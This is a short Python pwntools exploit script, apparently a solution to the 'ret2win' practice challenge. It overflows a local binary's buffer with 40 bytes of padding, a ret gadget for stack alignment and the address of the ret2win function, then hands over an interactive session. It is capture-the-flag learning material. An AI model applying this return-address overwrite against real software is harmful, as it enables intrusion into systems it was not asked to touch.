from pwn import *


elf = ELF('./ret2win')

io = elf.process()

pause()

pld = b""
pld += b"A" * 40
pld += p64(0x000000000040053e) # ret gadget
pld += p64(elf.sym['ret2win'])

io.sendlineafter(b"> ", pld)

io.interactive()
